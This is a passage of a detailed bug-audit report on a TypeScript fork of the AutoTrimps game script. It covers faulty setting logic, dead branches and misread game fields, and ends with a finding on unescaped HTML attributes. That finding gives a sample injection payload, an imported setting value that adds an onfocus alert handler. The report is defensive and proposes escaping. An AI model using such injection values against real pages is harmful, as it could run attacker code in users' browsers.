      mapLoot: { enabled: 1 }, mapAtZone: maz,
    } },
  })
  ;(globalThis as any).shouldDoMaps = false
  maps.autoMap()
  return (globalThis as any).shouldDoMaps as boolean
}

let maps: typeof import('../src/modules/maps')
beforeEach(async () => { maps = await import('../src/modules/maps') })

describe('autoMap MaZ mirror honours the ACTIVE preset (config.js:1435 getSetZone)', () => {
  it('preset A: parks at the configured zone (control — passes today)', () => {
    expect(shouldDoMapsAt(200, mazFixture('a'))).toBe(true)   // setZone[0].world === 200
    expect(shouldDoMapsAt(250, mazFixture('a'))).toBe(false)
  })

  it('preset B: must follow setZoneB, not the stale setZone', () => {
    // FAILS TODAY: maps.ts:483 reads .setZone, so AT parks forever at the factory 200 while
    // the game (main.js:13397 getSetZone) is driving off setZoneB and wants 250.
    expect(shouldDoMapsAt(200, mazFixture('b'))).toBe(false)  // actual today: true  <- spurious permanent park
    expect(shouldDoMapsAt(250, mazFixture('b'))).toBe(true)   // actual today: false <- user's real MaZ ignored
  })

  it('a row with on:false is skipped, as main.js:13407 does', () => {
    const maz = Object.assign(mazFixture('a'), {
      setZone: [
        { world: 180, through: 1000, cell: 100, times: -1, on: false }, // user unticked 'Active?'
        { world: 230, through: 1000, cell: 100, times: -1, on: true },
      ],
    })
    // FAILS TODAY: the loop never reads .on, so AT parks at 180 forever and never reaches 230.
    expect(shouldDoMapsAt(180, maz)).toBe(false)              // actual today: true
  })
})

**Strongest counter-argument considered.** AT's own tooltip declares this combination unsupported. settings-defs.ts:1194, on the U1 `AutoMaps` setting, reads `cannot: 'Work alongside <b>MaZ</b>. Do not run both.'` — and that line was written by commit 8d3915d8, "rewrite all 574 settings tooltips AGAINST THE CODE THAT IMPLEMENTS THEM." So someone read maps.ts:481-487, saw the mirror was partial, and documented it honestly rather than fixing it. The asymmetry is damning for the finder's severity claim: U2's `RAutoMaps` (settings-defs.ts:1385) carries NO such warning, because its MaZ handler is correct.

I weighed this and it lowers severity but does not refute. The warning is advisory prose in a hover tooltip, not a guard: nothing in the code prevents both being on, `mapAtZone` is NOT among the nine natives that #150's native-conflicts.ts badges (autoPrestige / autoUpgrade / autoStructure / autoJobs / autoStorageOff / autoGolden / autoEquip / buildingsOrphan / jobsOrphan), and lines 481-487 exist precisely to make the two coexist. Code that purports to handle a state and handles it wrongly is still wrong; the fix is two lines (`getSetZone()` + `on !== false`) and strictly reduces spurious stalls. The finder never mentioned the warning exists, which is a real gap in the write-up.

Two secondary corrections to the claim as written: (a) the assertion that the defect drives the line-665 keep-repeat via `vanillaMapatZone` is WRONG — `vanillaMapatZone` is assigned at 481 independently of the setZone loop, so it is true at every zone whenever MaZ is enabled and no spire is active. That effect is unconditional and is a separate question, not a consequence of reading the wrong array. (b) The finder listed `on`/`cell`/`through` as the ignored fields but missed `.times` (Zone Repeat), which produces the largest divergence of all.

---

### `AMU: Trimple` is unreachable at its own default configuration — the natural Trimple branch swallows the case and `continue`s

`src/modules/maps.ts:205`

**Sim-visible?** No. `AutoMaps` defaults to 1 (not 2) and `AMUtrimple` defaults to `false`, so the whole AMU block is inert on all 12 fixtures; the branch also needs z34+ with an unclaimed Ancient Treasure.

**Trigger.** Universe 1, `AutoMaps == 2` (Unique mode), `AMUtrimple` checked, NOT running Challenge², `game.mapUnlocks.AncientTreasure.canRunOnce` still true, zone >= 34, and `TrimpleZ` anywhere in (-33, 33) — which includes its createSetting default of **0**.

**Actual.** Line 199's natural branch tests `!runningC2 && canRunOnce && game.global.world >= treasure`. With `treasure = 0` that is `world >= 0` — always true — so the `if` is taken, and line 201's `treasure > -33 && treasure < 33` fires `continue`, skipping to the next map. The `else if` at line 205 (the AMUtrimple twin) is therefore never evaluated in a non-C2 run. AMUtrimple only ever reaches its body when `runningChallengeSquared` is true, i.e. the checkbox works ONLY during C2 — the inverse of what its tooltip describes.

**Expected.** AMUtrimple should be able to run Trimple Of Doom for the Ancient Treasure independently of `TrimpleZ`, as `settings-defs.ts:1206` promises: "This is independent of the Trimple Z setting elsewhere on this panel". Either hoist the AMU test above the natural branch, or make the natural branch's `continue` fall through to the AMU test instead of skipping the map.

**Impact.** **Opt-in setting, double-gated, low reach — but a genuinely dead control plus a false tooltip.** Requires Universe 1, `AutoMaps == 2` (Unique mode; default is **1**, so non-default), and `AMUtrimple` checked (default **false**). For a user in exactly that configuration at z34+ with the Ancient Treasure unclaimed and `TrimpleZ` anywhere in (−33, 33) — which includes its default of 0 and is what both frozen settings blobs carry — checking "AMU: Trimple" does **nothing**: `selectUniqueMap()` returns `undefined` for Trimple every tick, forever, and Trimple is `noRecycle` so no other path can select it. The forgone value is the one-time Ancient Treasure (doubles food/wood/metal), not an ongoing loss.

Perverse inversion worth noting: the checkbox *does* work during Challenge² runs — the exact opposite of its sibling AMU tooltips (AMUprison/AMUbw both say "Ignored during Challenge² runs"), and the opposite of what a user would infer.

**Zero sim exposure.** No corpus fixture sets `AutoMaps: 2` or `AMUtrimple` (`scripts/sim/corpus.mjs`), so the whole AMU block is inert across all 12 fixtures and `baseline-zero` says nothing about it. The natural branch, by contrast, runs every tick on the corpus (AutoMaps > 0, TrimpleZ 0) and stably `continue`s — which is exactly why the trace differential is green and blind here simultaneously.

**No balance implications.** The fix is pure control flow — hoist the AMU test above the natural branch, or make line 201's `continue` fall through to the AMU test instead of skipping the map. No game constant is involved; `33`, `Math.ceil(difficulty/2)`, and `1.8` all match the clone.

**Strongest counter-argument considered.** **The port is byte-faithful to the pre-conversion legacy, so this is inherited, not introduced.** `git show d283f152:legacy/modules/maps.js:465-477` has the identical structure — same `else if`, same `continue` on `treasure > -33 && treasure < 33`, same `world >= treasure`. The only thing #42 changed was appending `&& game.mapUnlocks.AncientTreasure.canRunOnce` to the AMU branch. Under the repo's own convention ("filter faithful-to-legacy-intended from genuine defects"), an inherited quirk in an ~8-year-old third-party script arguably isn't a port regression at all.

Two things blunt it. First, the fork *took ownership of the semantics* twice: #42 explicitly audited AMU-branch reachability in this very function (deleting AMUwall/AMUanger for being unreachable) and left this one; and the #111–#119 tooltip audit replaced the legacy's vague `'Turn on to run this map every run. '` with a new, specific, checkable claim — "This is independent of the **Trimple Z** setting" — that the code does not implement. A fork-authored description that promises behaviour the code lacks is a fork-owned defect regardless of the code's provenance. Second, a charitable reading of "independent" as "these are two separate triggers" doesn't save it, because the *other* clause — "run Trimple Of Doom every time it becomes available" — is independently false at the default.

A weaker counter: for `TrimpleZ ≥ 33` the natural branch runs Trimple anyway, so the checkbox is redundant rather than broken there. True, but that only narrows the defect to `TrimpleZ ∈ (-33, 33)` — which is where the default lives and where every user who never touched the box sits.

---

### `finishExpOnBw = -1` cannot disable the Experience BW finish: the 125 clamp runs first, so `finishOnBw != -1` is a constant `true` and the `: -1` arm is dead code

`src/modules/maps.ts:830`

**Sim-visible?** No. The Experience challenge requires `getHighestLevelCleared(true) >= 599` (config.js filter) and the branch requires world > 600; the deepest fixture is z62, and `farmWonders` defaults to false.

**Trigger.** Experience challenge active, `farmWonders` on, `finishExpOnBw` set to -1 (the sentinel every neighbouring AT setting uses for "off", and the one this very expression tests for), world > 600, world != 700, `maxExpZone != -1`, world >= `maxExpZone`.

**Actual.** Line 830 clamps first (`pageSetting = pageSetting < 125 ? 125 : pageSetting`), so -1 becomes 125 before line 831 ever tests it. Line 831 then snaps 125 -> 125. `finishOnBw` is therefore never -1 for any input: the `: -1` fallback on line 831 is unreachable, and the `finishOnBw != -1` conjunct on line 872 is a constant `true` that can never gate anything. A user who types -1 to turn the BW finish off instead gets AT selecting and running a Bionic Wonderland at level 125 (or, if no L125 BW is owned, the lowest/highest owned BW) while standing at zone 600+.

**Expected.** The `-1` disable check must precede the clamp — e.g. return -1 immediately when the setting is -1, then clamp/snap. Its sibling in the same condition, `wondersFromZ != -1` (`maxExpZone`), is a live check, which is what establishes that -1 was meant to be a live sentinel here too.

**Impact.** **Opt-in + deep-game only. Zero effect on the default path, and structurally invisible to every existing net.**

- **Default users: unaffected.** `farmWonders` is `'boolean', false` (`settings-defs.ts:1333`), so the entire Experience block at `maps.ts:824` is inert. `finishExpOnBw` does not even render (`settings-visibility.ts:491` gates it on `farmWonders`).
- **To fire, all of:** the Experience challenge active (game-gated at `getHighestLevelCleared(true) >= 599`, i.e. a z600+ veteran), `farmWonders` ON, `maxExpZone != -1`, `world > 600`, `world != 700`, and the user having typed a value below 605 into `finishExpOnBw` — `-1` being the specific case the code pretends to handle.
- **Consequence when it fires:** AT commits to a BW the game cannot accept as a completion (`config.js:9163` needs `mapLevel >= 605 && world > 600`). The Experience challenge cannot end via the BW route, and AT re-enters a sub-605 BW each time it exits instead of returning to the world. Mitigated (sometimes rescued) if the lowest owned BW is itself ≥605 or if the native `climbBw` option is on. The user-visible tell is contradictory: the button reads "Finish XP on BW: ∞" while AT targets 125.
- **Guarding:** none. `farmWonders: false` in the only at-settings fixture and a z62 corpus ceiling mean no trace, no census row, and no characterization test covers this branch — `tests/maps.characterization.test.ts:715` seeds `-1` but arms the other arm. This is exactly an "effectively unguarded region", so absence of a red is not evidence here.
- **Blast radius of a fix:** one expression, no game-balance numbers touched. Reordering to test `-1` before the clamp restores the author's intended disable and revives the already-written `finishOnBw != -1` gate. Note the fix should be scoped deliberately: it addresses `-1`, but any target `< 605` is un-completable, which is the broader latent issue.

**Strongest counter-argument considered.** Two, taken together — they bound the impact but do not break the finding.

**(a) "`farmWonders` is the off switch; `finishExpOnBw` never had an 'off', so this is just dead code."** The setting's default was `'605'` from birth (never `-1`), and upstream commit `750225ec` deliberately *removed* the "Invalid BW number detected" debug in favour of documenting the snap. The current #107 tooltip states plainly: *"Cannot go below zone 125 — anything lower is treated as 125."* So a user who reads the hover text is **not** misled about the clamp, and the "user types -1 expecting off and is surprised" story is weaker than the finder presents. — Rebuttal: the tooltip was rewritten in `8d3915d8` whose commit message is *"rewrite all 574 settings tooltips **against the code that implements them**"* — it documents the bug, it is not evidence of original intent. And it still does not warn that 125 can never end the challenge, while the value-input dialog ("Put -1 for Infinite") and the ∞ button glyph actively contradict it. Regardless, the dead `: -1` arm and the constant-`true` `finishOnBw != -1` conjunct are dead under *either* reading of intent.

**(b) The soft-lock is state-dependent, not guaranteed.** With `finishOnBw = 125` the fallback picks the **lowest** of the ≤3 owned BWs. If that lowest happens to be ≥ 605, the challenge still completes correctly by accident. And if the player has the native `climbBw` option on with `repeatMap` (`main.js:15651`, `getNextBwId()`), the game auto-climbs to higher owned BWs and can reach 605 without AT re-selecting. So "AT runs a sub-605 BW forever" is the *likely* outcome, not a certain one — I could not prove an unconditional soft-lock, and the finder's report should not claim one.

---

### Experience wonder-farm calls `buyMap()` without ever writing `mapLevelInput`, so it can buy a below-world map that the game will never spawn a Wonder in

`src/modules/maps.ts:854`

**Sim-visible?** No. Same gating as the previous finding — Experience challenge needs z600 cleared and `farmWonders` defaults to false.

**Trigger.** Experience challenge active, `farmWonders` on, `wondersAmount > game.challenges.Experience.wonders`, `world >= game.challenges.Experience.nextWonder`, `world >= wondersFloorZ`, `!game.global.mapsActive`, and no owned non-Bionic map at exactly `game.global.world`.

**Actual.** The branch sets `selectedMap = "create"`, logs `"Buying a Map, level: #" + game.global.world` (line 852-853), calls `mapsClicked(true)` (which enters the map chamber synchronously via `mapsSwitch()`), then calls `buyMap()` — with no write to `mapLevelInput`. `buyMap()` reads that input (`main.js:6591`), so the map actually created is at whatever level the box last held: `siphlvl` (= world − Siphonology) from autoMap's normal create path at line 718, or a stale value. The game only rolls a Wonder when `mapLevel >= game.global.world` (`config.js:4053: if (mapLevel < game.global.world) return;`), so a sub-world map is Wonder-ineligible; the next tick's `filter(map.level == game.global.world)` also fails to match it, so the branch re-enters and buys again. The branch additionally never calls `selectMap()`/`runMap()` on what it bought, and only handles `result == -2` (ignoring `-1` "level out of range" and `-3` "can't afford").

**Expected.** Set `mapLevelInput` to `game.global.world` before `buyMap()` — which is what the debug message already claims, what the U2 twin does (`maps.ts:1471: byId("mapLevelInput").value = game.global.world`), what the U1 normal create path does (`maps.ts:718`), and what the game's own auto-map helper does (`main.js:3089-3095`: `mapsClicked(true)` -> set `mapLevelInput` -> `buyMap()` -> `selectMap(...)` -> `runMap()`).

**Impact.** Opt-in, deep-game only, structurally invisible to the proof net — but a genuine functional break when it fires.

Gating (all verified): `farmWonders` is createSetting'd 'boolean', default FALSE (settings-defs.ts:1333); `wondersAmount` is 'value', default '0', and the gate is `wondersAmount > game.challenges.Experience.wonders` = `0 > 0` = false, so even flipping farmWonders on leaves it inert until the user types a number; settings-visibility.ts:488-491 renders all four Experience settings only when `!radonon` (U1) and, for the other three, only when farmWonders is on. The Experience challenge itself needs `getHighestLevelCleared(true) >= 599` (config.js:4095) and the block only acts at world >= wondersFloorZ (default maxExpZone 600 => >= 600). Deepest corpus fixture is z62, so baseline-zero cannot see this region at all — the proof net is silent by construction here, not by evidence.

Severity for the users who do reach it:
- Default map preset + AT in the world at that tick: no bug (accidentally correct).
- Default preset + AT already in the map chamber (follows any wonder-farm buy that returned an unhandled -3/-2, which the 1.2x-6.5x fragment cost gap makes reachable): one duplicate, Wonder-ineligible map bought per occurrence, wasted fragments, wonder acquisition delayed by the ticks it takes to get back to the world.
- Any user with a saved Adv-Maps preset whose offset is negative (e.g. the world-1 farm level that AT's own maxlvl logic assumes for mapLoot-talent players): the wonder farm is completely dead — every buy is sub-world, no Wonder can ever roll, and AT re-buys a map every tick, burning fragments and churning the 100-map cap for the whole challenge. That is the case worth fixing for.

**Strongest counter-argument considered.** The single strongest refutation — and it kills the claim as written — is that `mapsSwitch()` calls `resetAdvMaps()` (main.js:10872) on every transition INTO the map chamber, and resetAdvMaps sets `mapLevelInput = game.global.world` for the default preset (`offset: 'd'`, config.js:327-376). Since the wonder-farm arm is guarded by `!game.global.mapsActive` and mapsActive/preMapsActive are mutually exclusive, the overwhelmingly common state at that line is "AT is in the world", where mapsClicked(true) enters the chamber and the game hands the branch exactly the level it wanted. So the claim's stated trigger list is NOT sufficient to produce the bug, and its stated mechanism ("the box holds siphlvl from line 718") is false on that path — the branch works by luck, every time, for a default-preset user who is not already sitting in the map chamber. A second, weaker counter: the branch is byte-faithful to upstream AutoTrimps, so it is not something this repo broke; and a third: even in the failing case AT usually recovers within a tick or two, because after buying a siphon-level map the next tick selects and runs it, earns fragments, and eventually affords the world-level map — the sustained-stall version requires the preset-offset variant (B), not the default one.

---

### smithylogic falls off the end and returns undefined, blocking every U2 gear purchase whenever a resource the item does NOT cost is near a Smithy

`src/modules/other.ts:476`

**Sim-visible?** No. `Rsmithylogic` defaults to `false` (settings-defs.ts:905) and `Rsmithynumber`/`percent`/`seconds` all default to '-1', so the guard at other.ts:384 returns `go` immediately on all 12 fixtures. No fixture in scripts/sim/corpus.mjs seeds any of them.

**Trigger.** U2 player turns on Smithy Savings (`Rsmithylogic` = true) with `Rsmithynumber`/`Rsmithypercent`/`Rsmithyseconds` all > 0 and Smithy count above `Rsmithynumber`. Then `RautoEquip` (equipment.ts:847) calls `smithylogic(equipName, resourceUsed, true)` while exactly one of wood/metal/gems is within `Rsmithyseconds` of affording the next Smithy — and it is not the resource that item costs. E.g. buying a Shield (wood) while METAL is the close resource, or buying a Dagger (metal) while GEMS is close.

**Actual.** For an equipment call only one of `itemwood`/`itemmetal`/`itemgems` is non-null (other.ts:446-450); the other two stay `null`. The six-branch else-if chain (other.ts:457-475) pairs each `smithyclose*` flag with a name-list that the equipment name does not belong to for the other two resources, so no branch matches and the function reaches line 476 and returns `undefined`. equipment.ts:847 tests `if (smithylogic(...))`, so `undefined` reads as "do not buy"; `keepBuying` stays false, the `do/while` exits, and AT buys no gear this tick. Because the result is a pure function of state, the same verdict repeats every tick — gear buying stops entirely for as long as that resource stays "close".

**Expected.** The chain should end in `return go` (true — allow the purchase). A resource that the item does not cost cannot be a reason to withhold it; the wood/metal/gems branches are meant to be independent guards, not an exhaustive dispatch.

**Impact.** **Opt-in, U2-only, double-gated — but severe when armed.**

Reachability chain, all verified: `Requipon` (AutoEquip master switch) is `'boolean', false` by default (settings-defs.ts:1125-1128) and U2-only; `Rsmithylogic` is `'boolean', false` (settings-defs.ts:902-905); `Rsmithynumber` / `Rsmithypercent` / `Rsmithyseconds` are all `'value', '-1'` (settings-defs.ts:906-921). The guard at other.ts:384 (`… <= 0 …`) returns `go` immediately unless all four are configured, and other.ts:387 additionally requires `Smithy.owned > Rsmithynumber`. `settings-visibility.ts:372-375` gates all four behind `radonon` (U2) and hides the three value boxes unless `Rsmithylogic == true` — the render gate and the runtime gate agree here, no hidden third state. Smithy itself is `blockU1: true` (config.js:11707), so U1 is structurally unaffected.

**Sim-visible: NO.** All 12 at-settings fixtures carry `"Rsmithylogic":false,"Rsmithynumber":"-1","Rsmithypercent":"-1","Rsmithyseconds":"-1"` (single unique value across the whole fixture directory), and `scripts/sim/corpus.mjs` contains no `smithy` match at all. `baseline-zero` is green here because the guard short-circuits on every fixture, not because the region is correct. This is an unguarded region.

**For the U2 player who does turn Smithy Savings on** (its own tooltip advertises it as a deep-U2 optimisation), the effect is not a small mis-buy: in the `closeGems`-only band all 13 equipment pieces return `undefined` and AutoEquip levels nothing, while the ungated prestige loop keeps firing and `prestigeEquipment` resets each item to level 1. The `Requip2` block can only claw back to level 2. The freeze persists until income or Smithy count moves it — hoarding does not clear it, because the test is on income per second, not on stock.

**Strongest counter-argument considered.** Two real ones, and neither survives.

**(a) "Faithful to legacy, therefore intended."** The chain is byte-identical to the pre-strangler `other.js`, so the port introduced nothing. One could read the author's intent as "when the Smithy is close in ANY resource, hold everything." That reading is refuted by the code itself: `var go = true` is the initialization (default = allow), and the author wrote *symmetric* block/allow pairs per resource with a percent threshold on each. If the intent were "hold everything when any resource is close," all six percent comparisons would be dead weight. The control run above shows the percent test working correctly whenever the flags align and being silently bypassed when they don't — that is a missed cell in an enumeration, not a design. The repo's own tooltip (settings-defs.ts:914, written in this repo) promises a percent-gated withhold and its `cannot:` line explicitly says the building branches never run — nothing anywhere describes withholding on a resource the item does not cost. And this repo's whole #68–#119 series is exactly the class "faithful port of an inherited upstream defect, filed anyway."

**(b) "The value cannot occur / it is guarded upstream."** Checked and false. `getBuildingItemPrice` returns a real number for all three Smithy resources, so all three flags are live. The sole caller is `equipment.ts:847` (verified by grepping `smithylogic(` across all of `src/` — only that one site plus the `at-legacy.d.ts` declaration and two test stubs), and it does a bare truthiness test with no `!== false` and no default. `RautoEquip` is dispatched every tick from `main-loop.ts:541-542`.

A third, weaker objection: in the `closeMetal`-only case, blocking a Shield happens to coincide with a defensible policy (wood is the bottleneck). But that is luck, not logic — the block fires regardless of how trivially cheap the Shield is, and it does not hold in the `closeGems`-only case, where *nothing* is bought at all.

---

### armormagic ORs the C2 and Daily multitoggles, so each setting's mode fires on the other's trigger — contradicting both tooltips' ignoredWhen

`src/modules/other.ts:234`

**Sim-visible?** No. Both settings default to 0 (settings-defs.ts:240 and :677) and no fixture seeds them; the dispatcher's `> 0` guard is false on all 12 traces. Reaching it also requires a Daily with bogged/plague/pressure or a Toxicity/Nom run — the corpus has neither.

**Trigger.** Set `carmormagic` (C2 Armor Magic) and `darmormagic` (Daily Armor Magic) to DIFFERENT non-zero modes. Example: `darmormagic` = 1 ("DAM: Above 80%"), `carmormagic` = 3 ("CAM: Always"). Then run a Bogged/Plague/Pressure Daily below 80% of your highest cleared zone with soldier health at <= 40% of max.

**Actual.** main-loop.ts:363 admits the call because `darmormagic > 0` and the Daily-modifier conditions hold. Inside, other.ts:234's third arm is `((getPageSetting('carmormagic') == 3 || getPageSetting('darmormagic') == 3) && soldierHealth <= soldierHealthMax*0.4)` — `carmormagic == 3` satisfies it, so `buyArms()` fires and the "Above 80%" zone gate the user chose for Dailies is bypassed. The mirror case is identical: on a plain or C2 Toxicity/Nom run admitted via `carmormagic > 0`, a `darmormagic` of 2 or 3 supplies the mode. Neither the dispatcher nor the body ever checks which context admitted the call. `Rarmormagic` (other.ts:327) has the same shape.

**Expected.** Each multitoggle should gate only its own context, as both tooltips promise. `carmormagic`: "ignoredWhen: You are not running the Toxicity or Nom Challenge² — it has no effect anywhere else, including Dailies (use Daily Armor Magic for those)" (settings-defs.ts:676). `darmormagic`: "Buys armor to try to survive Bleed/Plague/Bogged Dailies" (settings-defs.ts:237). The body needs the mode read to be selected by context (Daily → darmormagic, C2 → carmormagic), not OR'd.

**Impact.** **Opt-in, deep-game, moderate severity — not on any default path.**

- **Default-path users: unaffected.** Both `carmormagic` (settings-defs.ts:677) and `darmormagic` (:240) default to `0`. Verified coercions: `0 > 0` false, `0 == 1|2|3` false. A user who never touches these is fully inert, and neither id is phantom (both are `createSetting`'d), so the `false == 0` trap does not apply here.
- **Trigger requires an opt-in config:** both settings non-zero **and set to different modes**. Not exotic — one of the two frozen real-user blobs in `src/modules/utils.ts:51` is exactly `"darmormagic":3,"carmormagic":1`.
- **Deep-game gated.** Toxicity unlocks at `getHighestLevelCleared(true) >= 164` (config.js:3817); Toxad²/Nometal² at ≥179/≥144. The Daily direction is reachable much earlier (any Bogged/Plague/Pressure Daily without Empower/Bloodthirst).
- **Consequence is resource misallocation, not a crash.** `buyArms()` (other.ts:74-86) calls the traced native `buyEquipment` for up to 7 armour pieces up to `CapEquiparm`, spending metal at a moment the user's chosen zone/H:D gate said not to. Given the repo's own finding that AT's gear buyer is satisficing and that *timing* is the win (#108/#153), an unwanted early armour dump is a real but bounded regression.
- **U2 is worse in kind, smaller in blast radius:** `Rcarmormagic` has *no* reachable legitimate context at all (Toxicity/Nom are U1-only), so 100% of its observable effect is overriding the user's `Rdarmormagic` choice on U2 Dailies.
- **Proof-net visibility: zero.** The only fixture carrying an at-settings file (`tests/fixtures/at-settings/p18-z2-balance-stall.json`) has `"darmormagic":0,"carmormagic":0`; the deepest fixture is z62 vs Toxicity's z164, and the corpus has no bogged/plague/pressure Daily. `baseline-zero` is structurally incapable of seeing this — its greenness is not evidence here.

**Recommended shape of a fix (mechanism only, no balance numbers):** thread the admitting context into `armormagic()`/`Rarmormagic()` (e.g. a `mode` argument resolved by the dispatcher, or read `game.global.challengeActive == 'Daily'` inside the body) so exactly one setting supplies the mode. Separately worth filing: the "C2 Armor Magic" label vs `challengeActive()` also matching plain non-C2 Toxicity/Nom runs.

**Strongest counter-argument considered.** Three real refutation attempts, all of which I ran down and none of which held:

**(a) "It's faithful to legacy, therefore intended."** This is the strongest one and it is half-true — the OR is verbatim 2018 upstream, and CLAUDE.md says to filter faithful-to-legacy-intended from genuine defects. What kills it: the *same author's* dispatcher gates each context by its own setting's `> 0`, so the source contradicts itself; and the two settings exist as separate multitoggles with distinct labels ("DAM:" vs "CAM:"), which would be pointless if one shared mode were intended. Decisively, the tooltips promising the separation are *this project's* code, so the shipped documentation is false regardless of what a 2018 author meant.

**(b) "`tests/other.armormagic.test.ts` already exists and passes — it must encode the OR as intended."** I read it. It never sets `darmormagic` at all; `getPageSetting` returns `false` for the absent key (utils.ts:56-58) and `false == 1/2/3` are all false, so every case exercises `carmormagic` alone. The suite is simply blind to the cross-fire. Its `carmormagic=0 → does not buy` case would flip to buying if `darmormagic` were 3.

**(c) "settings-visibility hides one of them, so they can't both be set."** `toggleElem` (settings-visibility.ts:77-84) only writes `style.display`; it never touches the stored value. And in U1 *both* `darmormagic` (:188) and `carmormagic` (:322) are `turnOn`'d simultaneously, so a U1 player sees and sets both.

**One over-claim in the finder's report I had to correct:** I initially drafted a test asserting that `carmormagic=0` + `darmormagic=3` should not buy. That is wrong — with `carmormagic=0` the dispatcher can only admit via the Daily arm, where `darmormagic=3` firing is *correct*. The defect requires both settings non-zero **and holding different modes**; if they hold the same mode there is no observable difference. The finder's own worked examples satisfy this, but the general framing "each setting's mode fires on the other's trigger" is slightly broader than what is actually reachable.

---

### getPotencyMod reads game.unlocks.quickTrimps, a field the game deleted in v4.8 — the Quick Trimps x2 branch is permanently dead

`src/modules/query.ts:250`

**Sim-visible?** No. `getPotencyMod`'s only consumer is `getArmyTime()`, whose only consumer is an `onmouseover` tooltip string (breedtimer.ts:229). It terminates in no native mutator, so the L0 differential is structurally blind to it — and the DOM handler never fires headless.

**Trigger.** Any player who buys the Quick Trimps single-run bonus (20 bones, "+100% Breed Speed" until next Portal) and then hovers the Army Count control, which calls `getArmyTime()` (breedtimer.ts:229 `onmouseover`).

**Actual.** `if (game.unlocks.quickTrimps) potencyMod *= 2;` — `game.unlocks` contains only `imps` and `impCount` (.trimps-game/config.js:13356-13382). `game.unlocks.quickTrimps` is `undefined`, always falsy, so the x2 is never applied. `getArmyTime()` divides by the under-stated `potencyMod` and reports roughly twice the true seconds-to-breed.

**Expected.** Read `game.singleRunBonuses.quickTrimps.owned`, which is where the game stores it and what the game's own breed calculation uses (.trimps-game/main.js:5596 → 5625). AT already does this correctly in two sibling copies of the same formula: breedtimer.ts:50 and breedtimer.ts:113.

**Impact.** **Default path, but low severity — an advisory number, not behaviour.**

Who is affected: any player who has bought the 20-bone Quick Trimps single-run bonus in the current portal (blocked on Trapper/Trappapalooza per main.js:17403, otherwise freely purchasable) AND hovers the Army Count. The gating setting `showbreedtimer` defaults to `true` (settings-defs.ts:2891), so the tooltip is mounted for everyone out of the box — there is no opt-in shielding this.

How badly: the tooltip reports exactly 2.000000× the true seconds-to-breed (56.2 s vs the game's own 28.1 s in my worked case). A player using it to decide whether to send an army now is reading a number twice as pessimistic as reality. Nothing else moves: no AT automation reads `getPotencyMod` or `getArmyTime`, so zero behavioural change, zero trace impact, no risk to any purchase or map decision.

Proof-net visibility: **structurally blind, by construction.** `getArmyTime` terminates in a `setAttribute("onmouseover", …)` string on `#trimpsFighting`; it reaches no wrapped native mutator, and the DOM handler never fires headless. `baseline-zero` being green is not evidence about this line — it is evidence the net cannot see it. So this region is genuinely unguarded and will stay that way unless a unit test pins it.

Severity call: **LOW** — cosmetic/informational, on the default path, permanently dead since game v4.8 (~7 years of the fork's life). Cheap one-line fix (`game.singleRunBonuses.quickTrimps.owned`, matching breedtimer.ts:50/113), but the fix MUST come with a rewrite of `tests/query.characterization.test.ts:466-469`, which currently asserts the wrong world model and will keep passing either way.

**Strongest counter-argument considered.** Two real ones, neither of which refutes it.

(a) **"Advisory only, so not a bug."** `getPotencyMod` has exactly one consumer, `getArmyTime`, whose one consumer is a hover-tooltip string. No AT automation decision reads either, so no purchase, map, formation or job call changes — the L0 differential is structurally blind to it and *correctly* so, not by an oversight. A reviewer could argue this is cosmetic and therefore not worth a finding. Rebuttal: the tooltip makes a specific factual numeric claim to the player ("To Fight now would add: N seconds"), it is off by a clean factor of 2, and this repo's own convention treats tooltip text as a checkable claim about the code. It is wrong; it is just cheap.

(b) **"Faithful to legacy, not a conversion regression."** `git log --all -S"unlocks.quickTrimps"` traces the line back through `Update query.js` / `Modularize files` to the original upstream AutoTrimps `query.js`, written before the game's v4.8 move. So the TS port is byte-faithful and the port did nothing wrong — this is inherited upstream rot, not a strangler defect. That correctly reframes *blame*, but the code in `main` today still computes the wrong number, and the two sibling copies in breedtimer.ts were already corrected to `singleRunBonuses`, so "faithful" is not the standing policy for this formula.

I also tried and failed to refute it via: a savegame reintroducing the key (blocked by the game-keyed merge loop), a runtime write (only `goldMaps` and `imps` are written), and the `showbreedtimer` gate hiding the consumer (default is `true`).

---

### Persisted setting values are spliced unescaped into an HTML value="…" attribute in both input tooltips

`src/modules/settings-engine.ts:387`

**Sim-visible?** No. This is the tooltip/DOM input path; the sim never opens a settings tooltip, and nothing here terminates in a wrapped native mutator.

**Trigger.** Any `textValue` or `value` setting whose stored value contains a double quote, then clicking that control to open its input box. Reachable two ways: (a) the user types `say "hi"` into a textValue box and re-opens it; (b) a settings string pasted into Import (import-export.ts:950 loadAutoTrimps) or a saved profile carries e.g. "MaxGym":"\" onfocus=\"alert(1)". 29 textValue and 206 value settings are exposed.

**Actual.** Line 387 builds `<input id="customNumberBox" … value="${autoTrimpSettings[id].value}">` and line 409 the same for customTextBox, and both are written with `document.getElementById('tipText').innerHTML = tooltipText` (lines 393 / 415). A `"` in the stored value terminates the attribute: the box shows only the prefix, so pressing Apply writes the TRUNCATED value back (silent data loss), and everything after the quote is parsed as further attributes — so an imported settings string can attach an arbitrary event handler that fires when the user opens that setting.

**Expected.** Escape at the seam, the way import-export.ts:169 `escapeHtml()` already does for the cleanup preview — whose own comment states this exact threat model: "they are attacker-influenceable in principle (a bad settings-file import writes them), so they are escaped rather than trusted". #110 fixed the identical splice for the onmouseover attribute (escTipAttr/tooltipAttr, lines 131-138); the two input attributes were not covered.

**Impact.** **Opt-in setting, moderate blast radius, silent.**

Typeable path: all **29 `textValue` settings**, every one gated behind an ordinary opt-in parent (U2 Archaeology, AutoBattle, heirloom swapping, Time/Tribute/Alchemy farming). Not default-on, but not dead either — a user who turns on the feature and types a `"` gets silent truncation on the next open+Apply, up to complete erasure when the value starts with a quote (9 of 9 chars lost, measured).

Import-only path: **273 numeric-box settings** (206 `value` + 63 `multiValue` + 4 `valueNegative`). `parseNum` makes these unreachable by typing — a real narrowing of the claim, which said 206 were "exposed" without that caveat.

Severity ordering: (1) silent data loss — the user's configured value is overwritten with a truncated one and nothing throws, nothing looks broken; (2) a wrong value shown in the box, so the user cannot tell; (3) handler injection from an imported settings file or a shared `RABfarmstring`, which fires on `box.focus()` at L419/L402 with no extra interaction. Downstream, a corrupted heirloom-name setting silently kills the swap at `heirlooms.ts:48/50` (`loom.name == getPageSetting(...)` is exact equality).

Structurally unguarded: no test covers either splice (`tests/settings-engine.test.ts:169` mounts `#customNumberBox` by hand and reproduces the same flaw in its own fixture); `dom-ids.test.ts:222` only asserts the id exists; the L0 net never opens a tooltip. Fix is one helper at two call sites — reuse `escapeHtml` from `import-export.ts:169`, which I verified round-trips every case including the injection payload.

